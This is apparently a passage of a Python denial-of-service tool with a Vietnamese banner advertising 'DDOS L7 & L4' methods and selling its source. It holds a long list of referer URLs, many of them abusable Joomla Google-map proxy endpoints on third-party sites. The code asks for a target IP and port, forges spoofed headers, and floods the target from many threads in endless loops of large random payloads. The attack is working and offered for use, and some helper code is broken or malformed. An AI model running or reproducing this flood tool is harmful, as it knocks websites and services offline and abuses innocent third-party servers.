http://www.footgoal33.com/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.printingit.ie/plugins/content/plugin_googlemap2_proxy.php?url=,
http://bbtoma.com/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.tajmahalrestaurant.co.za/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=,
http://www.yerbabuenacuisine.com/plugins/system/plugin_googlemap2_proxy.php?url=,
http://www.rinner-alm.com/plugins/system/plugin_googlemap2_proxy.php?url=,
http://stockbridgetownhall.co.uk/plugins/content/plugin_googlemap2_proxy.php?url=,
http://mentzerrepairs.com/plugins/system/plugin_googlemap2_proxy.php?url=,
http://www.tilmouthwell.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=,
http://www.homevisionsinc.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=,
http://toddlers.nalanda.edu.in/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=,
http://cultura-city.rv.ua/plugins/system/plugin_googlemap3_proxy.php?url=,
http://secret.leylines.info/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=,
http://bike-electric.co.uk/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=,
http://www.centroaquaria.com/plugins/content/plugin_googlemap2_proxy.php?url=,
http://agenzia-anna.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
http://www.gretnadrug.com/plugins/system/plugin_googlemap2_proxy.php?url=,
http://www.crestwoodpediatric.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=,
http://www.oceans-wien.com/plugins/system/plugin_googlemap2_proxy.php?url=;BYPASS""",
    'http://www.bing.com/search?q=',
        "http://host-tracker.com/check_page/?url="
        "http://jigsaw.w3.org/css-validator/validator?url="
        "http://www.google.com/translate?u="
        "http://anonymouse.org/cgi-bin/anon-www.cgi/"
        "http://www.onlinewebcheck.com/?url="
        "http://feedvalidator.org/check.cgi?url="
        "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL="
        "http://www.translate.ru/url/translation.aspx?direction=er&sourceURL="
      'http://www.bus-reicherteu/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
    'http://www.maxxxi.ru/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://potholepeople.co.nz/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.hammondgolf.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.footgoal33.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.printingit.ie/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://bbtoma.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.tajmahalrestaurant.co.za/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
      'http://www.yerbabuenacuisine.com/plugins/system/plugin_googlemap2_proxy.php?url=',
      'http://www.rinner-alm.com/plugins/system/plugin_googlemap2_proxy.php?url=',
      'http://stockbridgetownhall.co.uk/plugins/content/plugin_googlemap2_proxy.php?url=',
        "http://validator.w3.org/feed/check.cgi?url="
        "http://www.pagescoring.com/website-speed-test/?url="
        "http://check-host.net/check-http?host="
        "http://checksite.us/?url="
        "http://jobs.bloomberg.com/search?q="
        "http://www.bing.com/search?q="
        "https://www.yandex.com/yandsearch?text="
        "http://www.google.com/?q="
        "https://add.my.yahoo.com/rss?url="
        "http://www.bestbuytheater.com/events/search?q="
        "http://www.shodanhq.com/search?q="
        "https://play.google.com/store/search?q="
        "http://coccoc.com/search#query="
        "http://www.search.com/search?q="
        "https://add.my.yahoo.com/rss?url="
        "https://images2-focus-opensocial.googleusercontent.com/gadgets/proxy?container=focus&url="
        "https://www.facebook.com/l.php?u=",
        "https://www.facebook.com/l.php?u=",
        "https://drive.google.com/viewerng/viewer?url=",
        "http://www.google.com/translate?u=",
        "http://downforeveryoneorjustme.com/",
        "http://www.slickvpn.com/go-dark/browse.php?u=",
        "https://www.megaproxy.com/go/_mp_framed?",
        "http://scanurl.net/?u=",
        "http://www.isup.me/",
        "http://www.currentlydown.com/",
        "http://check-host.net/check-ping?host=",
        "http://check-host.net/check-tcp?host=",
        "http://check-host.net/check-dns?host=",
        "http://check-host.net/ip-info?host=",
        "https://safeweb.norton.com/report/show?url=",
        "http://www.webproxy.net/view?q=",
        "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=",
        "https://anonysurfer.com/a2/index.php?q=",
        "http://analiz.web.tr/en/www/",
    'http://www.alltheweb.com/help/webmaster/crawler',
    'http://gais.cs.ccu.edu.tw/robot.php', 'http://www.googlebot.com/bot.html',
    'https://www.yandex.com/yandsearch?text=', 'https://duckduckgo.com/?q=',
    'http://www.ask.com/web?q=', 'https://www.fbi.com/',
    'http://search.aol.com/aol/search?q=',
    'https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=',
    'https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=',
    'https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=',
    'https://drive.google.com/viewerng/viewer?url=',
    'http://www.google.com/translate?u=',
    'https://developers.google.com/speed/pagespeed/insights/?url=',
    'https://replit.com/', 'https://check-host.net/', 'https://obaspro.my.id/',
    'http://www.oldbrogue.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
    'http://mentzerrepairs.com/plugins/system/plugin_googlemap2_proxy.php?url=',
    'http://www.tilmouthwell.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
    'http://www.homevisionsinc.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
    'http://toddlers.nalanda.edu.in/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
    'http://cultura-city.rv.ua/plugins/system/plugin_googlemap3_proxy.php?url=',
    'http://secret.leylines.info/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
    'http://bike-electric.co.uk/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
    'http://www.centroaquaria.com/plugins/content/plugin_googlemap2_proxy.php?url='
    'http://agenzia-anna.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url='
    'http://www.gretnadrug.com/plugins/system/plugin_googlemap2_proxy.php?url=',
    'http://www.crestwoodpediatric.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
    'http://www.oceans-wien.com/plugins/system/plugin_googlemap2_proxy.php?url=;BYPASS',
    'http://www.mcdp.eu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
    'http://www.dbaa.co.za/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
    'http://waggum-bevenrode.sg-bevenrode.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url='
    'http://bwsnt1.pdsda.net/plugins/system/plugin_googlemap3_proxy.php?url=',
    'http://www.astecdisseny.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.fillmorefairways.com/plugins/content/plugin_googlemap2_proxy.php?url=',
    'http://growtopiagame.com/', 'http://check-host.net/check-http?url=',
    'http://ip2location.com/', 'https://pointblank.com/',
    'https://www.ted.com/search?q=',
    'https://drive.google.com/viewerng/viewer?url=',
    'http://validator.w3.org/feed/check.cgi?url=',
    'http://host-tracker.com/check_page/?furl=',
    'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=',
    'https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=',
    'https://play.google.com/store/search?q=',
    'http://jigsaw.w3.org/css-validator/validator?uri=',
    'https://add.my.yahoo.com/rss?url=', 'http://www.google.com/?q=',
    'https://www.cia.gov/index.html', 'https://www.google.ad/search?q=',
    'https://www.google.ae/search?q=', 'https://vk.com/profile.php?redirect=',
    'http://jigsaw.w3.org/css-validator/validator?uri=',
    'https://add.my.yahoo.com/rss?url=',
    'http://www.google.com/?q=',
    'http://www.usatoday.com/search/results?q=',
    'http://engadget.search.aol.com/search?q=',
    'https://www.google.ae/search?q=', 'https://www.google.com.af/search?q=',
    'https://www.google.com.ag/search?q=',
    'https://www.google.com.ai/search?q=', 'https://www.google.al/search?q=',
    'http://www.usatoday.com/search/results?q=',
    'http://engadget.search.aol.com/search?q=',
    'https://steamcommunity.com/market/search?q=',
    'http://filehippo.com/search?q=',
    'http://www.topsiteminecraft.com/site/pinterest.com/search?q=',
    'http://eu.battle.net/wow/en/search?q=',
]
os.system("color A")
print("----------------------------------------------------------------------")
print(" ███▄    █ ▒██   ██▒▄▄▄█████▓   ▓█████▄ ▓█████▄  ▒█████    ██████ ")
print(" ██ ▀█   █ ▒▒ █ █ ▒░▓  ██▒ ▓▒   ▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ ")
print("▓██  ▀█ ██▒░░  █   ░▒ ▓██░ ▒░   ░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   ")
print("▓██▒  ▐▌██▒ ░ █ █ ▒ ░ ▓██▓ ░    ░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒")
print("▒██░   ▓██░▒██▒ ▒██▒  ▒██▒ ░    ░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒")
print("░ ▒░   ▒ ▒ ▒▒ ░ ░▓ ░  ▒ ░░       ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░")
print("░ ░░   ░ ▒░░░   ░▒ ░    ░        ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░")
print("   ░   ░ ░  ░    ░    ░          ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  ")
print("        ░  ░    ░                 ░       ░        ░ ░        ░  ")
print("                                 ░       ░                        ")



print("╔═══════════════════════════════════════════════╗")
print("║     Coder Tool Nguyễn XUân Trường L7          ║")
print("║     DDOS L7 & L4 Methods VIP V2               ║")
print("║     Nghiêm Cấm Spam Lệnh Attack!!!!!!         ║")
print("║     Mua Soucre & Tool DDOS INBOX              ║")
print("╚═══════════════════════════════════════════════╝")
print("")
print("   ╔════════════════════════════════════════╗")
print("       @COPYRIGHT BY Nguyễn Xuân Trường")
print("   ╚════════════════════════════════════════╝")
print("")
print("[+] SOURCE DESIGN BY NXT DEVELOPER     ")
print("[-] TCP || UDP || HTTP || NTP || JETX ")
print("------------------------------------------------------------------------")
ip = str(input(" IP / DOMAIN : "))
port = int(input(" PORT : "))
method = str(input(" Method : "))
times = int(input(" PACKETS : "))
threads = int(input(" THREADS : "))
time.sleep(5)
print("[0] Checking IP ..........")
time.sleep(2)
print("[0] Loading........")
time.sleep(3)
print("Attack Send To NXT " + ip)



def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assemebled

def GetMethodByName(method):
    if method == "SMS":
        dir = "tools.SMS.main"
    elif method == "EMAIL":
        dir = "tools.EMAIL.main"
    elif method in ("NETRO", "UDP", "TCP", "NTP", "JETX", "OVH"):
        dir = f"tools.L4.{method.lower()}"
    elif method in ("HTTP", "NETRO", "TCP"):
        dir = f"tools.L7.{method.lower()}"

def ddos():
    get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
    post_host = "POST HTTP/1.1\r\nHost: " + ip + "\r\n"
    get_data = "GET https://check-host.net//1.1\r\nHost: " + ip + "\r\n"
    referer = "Referer: " + random.choice(referers) + ip + "\r\n"
    connection = "Connection: Keep-Alive\r\n" + "\r\n"
    content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
    socks = "socks5: " + random.choice(socks5) + "\r\n"
    length = "Content-Length: 0\r\n"
    forward = "X-Forwarded-For: 1\r\n"
    forwards = "Client-IP: " + ip + "\r\n"
    accept = random.choice(acceptall) + "\r\n"
    mozila = "User-Agent: " + random.choice(accept) + "\r\n"
    connection += "Cache-Control: max-age=0\r\n"
    connection += "pragma: no-cache\r\n"
    connection += "X-Forwarded-For: " + spoofer() + "\r\n"
    header = post_host + socks + get_host + referer + mozila + forward + content + connection + length + "\r\n\r\n"
    randomip = str(random.randint(1, 255)) + "." + str(random.randint(
        0, 255)) + "." + str(random.randint(0, 255)) + "." + str(
            random.randint(0, 255)) + "\r\n"
    useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
    request = post_host + get_host + socks + forward + connection + mozila + forwards + header + useragent + accept + length + randomip + referer + content + "\r\n"
    data = random._urandom(150179)
    data1 = random._urandom(250179)
    data2 = random._urandom(350179)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((ip,port))
            s.send(data)
            s.send(data)
            s.send(data)
            s.send(data)
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.send(data)
            s.send(data)
            s.send(data)
            s.send(data)
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.send(data1)
            s.send(data1)
            s.send(data1)
            s.send(data1)
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.send(data1)
            s.send(data1)
            s.send(data1)
            s.send(data1)
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.send(data2)
            s.send(data2)
            s.send(data2)
            s.send(data2)
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.send(data2)
            s.send(data2)
            s.send(data2)
            s.send(data2)
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            for x in range(60000):
                s.send(data)
                s.send(data)
                s.send(data)
                s.send(data)
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.send(data)
                s.send(data)
                s.send(data)
                s.send(data)
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.send(data1)
                s.send(data1)
                s.send(data1)
                s.send(data1)
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.send(data1)
                s.send(data1)
                s.send(data1)
                s.send(data1)
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.send(data2)
                s.send(data2)
                s.send(data2)
                s.send(data2)
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.send(data2)
                s.send(data2)
                s.send(data2)
                s.send(data2)
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
            print("Attack Sent to NXT " + ip)
        except :
            s.close()

for y in range(threads):
    th = threading.Thread(target = ddos,daemon=True)
    th.start()
